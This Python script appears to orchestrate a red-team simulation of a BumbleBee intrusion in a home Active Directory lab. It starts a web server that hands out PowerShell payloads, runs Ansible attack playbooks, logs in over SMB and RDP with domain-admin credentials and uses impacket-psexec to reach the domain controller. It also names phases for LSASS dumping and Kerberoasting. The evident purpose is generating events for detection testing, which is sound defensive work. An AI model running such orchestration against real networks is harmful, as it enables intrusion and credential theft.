#!/usr/bin/env python3
"""
run_attack.py - BumbleBee Simulation Orchestrator
CapsuleCorp Active Directory Lab

Simulates the complete 11-day BumbleBee loader intrusion from DFIR Report Aug 2022.
Each day's attack phase is automated via Ansible playbooks targeting lab VMs.

Usage:
    python3 run_attack.py              # full simulation
    python3 run_attack.py --day 1      # single day only
    python3 run_attack.py --fast       # no delays between days
    python3 run_attack.py --check      # preflight check only
    python3 run_attack.py --list       # show all phases

Prerequisites:
    pip3 install colorama
    Ansible with pywinrm (pip3 install pywinrm)
    Sliver C2 running on Kali (or impacket-psexec as fallback)
    See setup_payloads.sh to prepare all payload files

Credentials:
    Set via environment variables before running:
        export DA_PASS="<domain-admin-password>"
        export SVC_PASS="<service-account-password>"
"""

import argparse
import os
import sys
import time
import random
import string
import logging
import threading
import subprocess
import glob
import http.server
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# ── Lab Config - update to match your environment ─────────
DC_IP          = "10.0.10.200"
BEACHHEAD_IP   = "10.0.10.210"
WORKSTATION_IP = "10.0.10.211"
KALI_IP        = "10.0.10.60"
DOMAIN         = "CAPSULECORP"
SLIVER_PORT    = 443
HTTP_PORT      = 8080
DAY_DELAY      = 5   # seconds between days (skipped with --fast)

# Credentials loaded from environment variables - never hardcode these
DA_PASS  = os.environ.get("DA_PASS", "")
SVC_PASS = os.environ.get("SVC_PASS", "")

if not DA_PASS or not SVC_PASS:
    print("[ERROR] Set DA_PASS and SVC_PASS environment variables before running.")
    print("  export DA_PASS='<domain-admin-password>'")
    print("  export SVC_PASS='<service-account-password>'")
    sys.exit(1)
# ─────────────────────────────────────────────────────────

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
ANSIBLE_DIR = os.path.join(BASE_DIR, "ansible")
PS1_DIR     = os.path.join(BASE_DIR, "payloads", "ps1")
TOOLS_DIR   = os.path.join(BASE_DIR, "payloads", "tools")
LOG_DIR     = os.path.join(BASE_DIR, "logs")
INVENTORY   = os.path.join(ANSIBLE_DIR, "inventory.yml")

os.makedirs(LOG_DIR, exist_ok=True)
log_file = os.path.join(LOG_DIR, f"attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("bb")

# ── Pretty print ──────────────────────────────────────────
def banner(msg, color=Fore.RED):
    print(color + "\n" + "="*60)
    print(color + f"  {msg}")
    print(color + "="*60 + Style.RESET_ALL)

def phase(msg):
    print(Fore.YELLOW + f"\n  [>] {msg}" + Style.RESET_ALL)
    log.info(f"PHASE: {msg}")

def step(msg):
    print(Fore.CYAN + f"      [+] {msg}" + Style.RESET_ALL)
    log.info(f"STEP: {msg}")

def ok(msg):
    print(Fore.GREEN + f"      [v] {msg}" + Style.RESET_ALL)
    log.info(f"OK: {msg}")

def warn(msg):
    print(Fore.MAGENTA + f"      [!] {msg}" + Style.RESET_ALL)
    log.warning(msg)

# ── Shell runner (real-time streaming output) ─────────────
def run(cmd, timeout=120, ignore_errors=False):
    log.info(f"RUN: {cmd}")
    try:
        process = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, text=True
        )
        full_output = ""
        for line in process.stdout:
            print(Style.DIM + line, end="")
            full_output += line
        process.wait(timeout=timeout)
        if process.returncode != 0 and not ignore_errors:
            warn(f"Exit {process.returncode}: check logs for details")
        return process.returncode == 0, full_output
    except subprocess.TimeoutExpired:
        process.kill()
        warn(f"Timeout ({timeout}s): {cmd[:60]}")
        return False, "timeout"
    except Exception as e:
        warn(f"Error: {e}")
        return False, str(e)

# ── Ansible runner ────────────────────────────────────────
def patch_playbooks():
    """Replace DFIR report hostnames with lab inventory names."""
    step("Patching Ansible playbooks with lab hostnames...")
    for pb_file in glob.glob(os.path.join(ANSIBLE_DIR, "*.yml")):
        try:
            with open(pb_file, "r") as f:
                content = f.read()
            patched = content.replace("VEGETA-PC", "BeachHead-PC").replace("TRUNKS-PC", "Yamcha-PC")
            with open(pb_file, "w") as f:
                f.write(patched)
        except Exception as e:
            warn(f"Could not patch {pb_file}: {e}")

def ansible(playbook, limit=None):
    pb  = os.path.join(ANSIBLE_DIR, playbook)
    cmd = (
        f"ansible-playbook -i {INVENTORY} {pb} "
        f"-e 'da_pass=\"{DA_PASS}\" svc_pass=\"{SVC_PASS}\" "
        f"kali_ip={KALI_IP} http_port={HTTP_PORT}'"
    )
    if limit:
        cmd += f" --limit {limit}"
    step(f"Ansible: {playbook}" + (f" [limit={limit}]" if limit else ""))
    ok_flag, _ = run(cmd, timeout=600)
    if ok_flag:
        ok(f"{playbook} complete")
    else:
        warn(f"{playbook} had errors - check {log_file}")
    return ok_flag

# ── HTTP payload server ───────────────────────────────────
_http_server = None

def start_http_server():
    """Serve PS1 payloads for IEX download cradles."""
    global _http_server

    class Handler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, fmt, *args):
            log.info(f"HTTP: {fmt % args}")
        def translate_path(self, path):
            return os.path.join(PS1_DIR, path.lstrip("/"))

    _http_server = http.server.HTTPServer(("0.0.0.0", HTTP_PORT), Handler)
    t = threading.Thread(target=_http_server.serve_forever, daemon=True)
    t.start()
    ok(f"HTTP server: http://{KALI_IP}:{HTTP_PORT}/ (serving payloads/ps1/)")

def stop_http_server():
    global _http_server
    if _http_server:
        _http_server.shutdown()

# ── PsExec fallback via Impacket ──────────────────────────
def sliver_psexec(sid, target):
    """PsExec to target via impacket. Generates Event 7045 on the DC."""
    svc = "".join(random.choices(string.ascii_lowercase + string.digits, k=7))
    step(f"PsExec to {target} | service name: {svc} (Event 7045 on target)")
    run(
        f"impacket-psexec {DOMAIN}/svc_backup:'{SVC_PASS}'@{target} "
        f"-service-name {svc} "
        f"\"cmd.exe /c whoami && hostname\"",
        timeout=60, ignore_errors=True
    )
    return svc

# ── Preflight ─────────────────────────────────────────────
def preflight():
    banner("Preflight Check", Fore.CYAN)
    patch_playbooks()

    checks = [
        (f"{TOOLS_DIR}/wab.exe",         "Sliver beacon (wab.exe)"),
        (f"{TOOLS_DIR}/namr.dll",         "Sliver DLL (namr.dll)"),
        (f"{TOOLS_DIR}/procdump64.exe",   "Procdump64"),
        (f"{TOOLS_DIR}/AnyDesk.exe",      "AnyDesk"),
        (f"{PS1_DIR}/PowerView.ps1",      "PowerView.ps1"),
        (f"{PS1_DIR}/kerberoast.ps1",     "kerberoast.ps1"),
        (f"{PS1_DIR}/lsass_dump.ps1",     "lsass_dump.ps1"),
        (f"{PS1_DIR}/vulnrecon_sim.ps1",  "vulnrecon_sim.ps1"),
        (f"{PS1_DIR}/seatbelt_sim.ps1",   "seatbelt_sim.ps1"),
        (f"{PS1_DIR}/adfind_sub.ps1",     "adfind_sub.ps1"),
        (f"{PS1_DIR}/sharefinder.ps1",    "sharefinder.ps1"),
        (INVENTORY,                        "ansible/inventory.yml"),
    ]
    all_good = True
    for path, label in checks:
        if os.path.exists(path):
            ok(label)
        else:
            warn(f"MISSING: {label}")
            all_good = False

    step("Testing SMB connectivity...")
    for ip, name in [
        (BEACHHEAD_IP,   "BEACHHEAD-PC"),
        (WORKSTATION_IP, "YAMCHA-PC"),
        (DC_IP,          "Goku (DC)"),
    ]:
        s, _ = run(
            f"smbclient //{ip}/C$ "
            f"-U '{DOMAIN}\\Administrator%{DA_PASS}' "
            f"-c 'ls' 2>&1",
            timeout=10, ignore_errors=True
        )
        ok(f"SMB OK: {name} ({ip})") if s else warn(f"SMB FAIL: {name} ({ip})")

    return all_good

# ── Attack days ───────────────────────────────────────────
def day1(fast):
    banner("DAY 1 - Initial Access > C2 > Discovery > AnyDesk > AdFind")
    start_http_server()
    ansible("attack_day1.yml")
    ok("Day 1 done - Expected: Sysmon 1, 3, 8, 11 | Event 7045 (AnyDesk) | C2 HTTPS traffic")
    if not fast:
        time.sleep(DAY_DELAY)

def day2(fast):
    banner("DAY 2 - VulnRecon on YAMCHA-PC", Fore.YELLOW)
    ansible("attack_day2.yml")
    ok("Day 2 done - Expected: Sysmon Event 1 (VulnRecon.ps1)")
    if not fast:
        time.sleep(DAY_DELAY)

def day4(fast):
    banner("DAY 4 - VulnRecon + Procdump LSASS + AdFind", Fore.YELLOW)
    ansible("attack_day4.yml")
    ok("Day 4 done - Expected: Sysmon 1, 10, 11, 23")
    if not fast:
        time.sleep(DAY_DELAY)

def day7(fast):
    banner("DAY 7 - AnyDesk Re-access + VulnRecon + Seatbelt", Fore.YELLOW)
    step("AnyDesk re-access via RDP auth")
    run(
        f"xfreerdp /v:{WORKSTATION_IP} "
        f"/u:Administrator /p:'{DA_PASS}' "
        f"/d:{DOMAIN} /cert-ignore /auth-only 2>/dev/null",
        timeout=10, ignore_errors=True
    )
    ansible("attack_day7.yml")
    ok("Day 7 done - Expected: Sysmon Event 1 (Seatbelt) | AnyDesk TLS in Zeek")
    if not fast:
        time.sleep(DAY_DELAY)

def day11(fast):
    banner("DAY 11 - FINAL: Kerberoast + LSASS + Sweep + PsExec DC")
    ansible("attack_day11.yml")
    phase("PsExec to DC with cracked svc_backup credentials (Event 7045 on DC)")
    sliver_psexec(None, DC_IP)
    ok("Day 11 done - Expected: Event 4769 RC4 | Event 7045 on DC | Sysmon 1, 8, 10, 23")
    banner("SIMULATION COMPLETE", Fore.GREEN)
    ok(f"Log saved: {log_file}")
    ok("Check Wazuh > Security Events > filter rule IDs 100500-100599")

# ── Main ──────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="BumbleBee Attack Simulation - CapsuleCorp Lab"
    )
    parser.add_argument("--day",   type=int, choices=[1, 2, 4, 7, 11],
                        help="Run a specific day only")
    parser.add_argument("--fast",  action="store_true",
                        help="Skip delays between days")
    parser.add_argument("--check", action="store_true",
                        help="Preflight check only, no attack")
    parser.add_argument("--list",  action="store_true",
                        help="Show all simulation phases")
    args = parser.parse_args()

    if args.list:
        print("""
  Day 1  - ISO/LNK trigger, C2 beacon, process injection,
            discovery, AnyDesk persistence, AdFind
  Day 2  - VulnRecon on YAMCHA-PC
  Day 4  - VulnRecon BEACHHEAD, Procdump LSASS, AdFind
  Day 7  - AnyDesk re-access, VulnRecon, Seatbelt
  Day 11 - Kerberoast, comsvcs LSASS, AdFind, sweep,
            PsExec to DC, LSASS on DC
""")
        return

    banner("BumbleBee Roasts Its Way to Domain Admin - CapsuleCorp")
    preflight()

    if args.check:
        ok("Preflight complete")
        return

    try:
        if not args.day or args.day == 1:  day1(args.fast)
        if not args.day or args.day == 2:  day2(args.fast)
        if not args.day or args.day == 4:  day4(args.fast)
        if not args.day or args.day == 7:  day7(args.fast)
        if not args.day or args.day == 11: day11(args.fast)
    finally:
        stop_http_server()

if __name__ == "__main__":
    main()